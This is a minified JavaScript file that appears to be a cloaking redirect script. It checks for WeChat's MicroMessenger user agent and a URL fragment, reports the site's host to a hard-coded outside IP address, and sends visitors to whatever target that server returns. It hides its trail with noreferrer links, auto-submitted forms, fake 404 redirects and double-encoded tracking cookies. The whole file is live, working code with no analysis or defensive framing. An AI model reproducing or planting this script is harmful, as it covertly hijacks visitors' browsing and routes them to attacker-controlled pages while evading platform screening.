function verify_entry(){var a=!1,b=!1,c=/MicroMessenger/gi;return a=c.test(ua),b=void 0!=url.split("#")[1],a=a&&b}function fetchjmp(){var a,b=new XMLHttpRequest;return b.open("POST",qhserver,!1),b.setRequestHeader("Content-type","application/x-www-form-urlencoded"),b.send("cdn="+host),a=b.responseText}function dogetjmp(a){if(a.startsWith("http")||(a="http://"+a),top==window&&document.body){var b=document.createElement("a");b.href=a,b.rel="noreferrer",document.body.appendChild(b),b.click()}else top.location.href=a}function dopostjmp(a){a.startsWith("http")||(a="http://"+a);var b=document.createElement("form");b.action=a,b.method="POST",document.body.appendChild(b),b.submit()}function setCookie(a,b){var c=new Date;c.setTime(c.getTime()+36e5),document.cookie=a+"="+escape(b)+(";expires="+c.toGMTString())}function getCookie(a){return document.cookie.length>0&&(start=document.cookie.indexOf(a+"="),-1!=start)?(start=start+a.length+1,end=document.cookie.indexOf(";",start),-1==end&&(end=document.cookie.length),unescape(document.cookie.substring(start,end))):null}function delCookie(a){var b,c=new Date;c.setTime(c.getTime()-1),b=getCookie(a),null!=b&&(document.cookie=a+"="+b+";expires="+c.toGMTString())}function encode(a){return escape(escape(Base64.encode(a)))}function decode(a){return Base64.decode(unescape(unescape(a)))}function dopostjmpA(a){var b=/.html/gi;b.test(a)?dogetjmp(a):dopostjmp(a)}var verified_entry,cid,clp,respraw,resp,ua=window.navigator.userAgent,host=window.location.host,uri=window.location.pathname,url=window.location.href,qhserver="http://47.89.12.242/entry.php",Base64={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(a){var b,c,d,e,f,g,h,i="",j=0;for(a=Base64._utf8_encode(a);j<a.length;)b=a.charCodeAt(j++),c=a.charCodeAt(j++),d=a.charCodeAt(j++),e=b>>2,f=(3&b)<<4|c>>4,g=(15&c)<<2|d>>6,h=63&d,isNaN(c)?g=h=64:isNaN(d)&&(h=64),i=i+this._keyStr.charAt(e)+this._keyStr.charAt(f)+this._keyStr.charAt(g)+this._keyStr.charAt(h);return i},decode:function(a){var b,c,d,e,f,g,h,i="",j=0;for(a=a.replace(/[^A-Za-z0-9\+\/\=]/g,"");j<a.length;)e=this._keyStr.indexOf(a.charAt(j++)),f=this._keyStr.indexOf(a.charAt(j++)),g=this._keyStr.indexOf(a.charAt(j++)),h=this._keyStr.indexOf(a.charAt(j++)),b=e<<2|f>>4,c=(15&f)<<4|g>>2,d=(3&g)<<6|h,i+=String.fromCharCode(b),64!=g&&(i+=String.fromCharCode(c)),64!=h&&(i+=String.fromCharCode(d));return i=Base64._utf8_decode(i)},_utf8_encode:function(a){var b,c,d;for(a=a.replace(/\r\n/g,"\n"),b="",c=0;c<a.length;c++)d=a.charCodeAt(c),128>d?b+=String.fromCharCode(d):d>127&&2048>d?(b+=String.fromCharCode(192|d>>6),b+=String.fromCharCode(128|63&d)):(b+=String.fromCharCode(224|d>>12),b+=String.fromCharCode(128|63&d>>6),b+=String.fromCharCode(128|63&d));return b},_utf8_decode:function(a){for(var b="",c=0,d=c1=c2=0;c<a.length;)d=a.charCodeAt(c),128>d?(b+=String.fromCharCode(d),c++):d>191&&224>d?(c2=a.charCodeAt(c+1),b+=String.fromCharCode((31&d)<<6|63&c2),c+=2):(c2=a.charCodeAt(c+1),c3=a.charCodeAt(c+2),b+=String.fromCharCode((15&d)<<12|(63&c2)<<6|63&c3),c+=3);return b}};delCookie("cdn"),delCookie("csp"),delCookie("clp"),verified_entry=verify_entry(),verified_entry?(cid=url.split("#")[1],clp=getCookie("clp"),null!=clp&&(clpage=decode(clp),dopostjmpA(clpage)),respraw=fetchjmp(),resp=respraw.split(":"),-1==resp[0]&&dogetjmp("http://"+host+"/404.html"),0==resp[0]&&(lurl=resp[1],setCookie("cdn",encode(host)),setCookie("csp",encode(uri)),setCookie("clp",encode(lurl)),setCookie("cid",encode(cid)),dopostjmpA(lurl)),1==resp[0]&&(lurl=resp[1]+"#"+cid,dogetjmp(lurl))):dogetjmp("http://"+host);
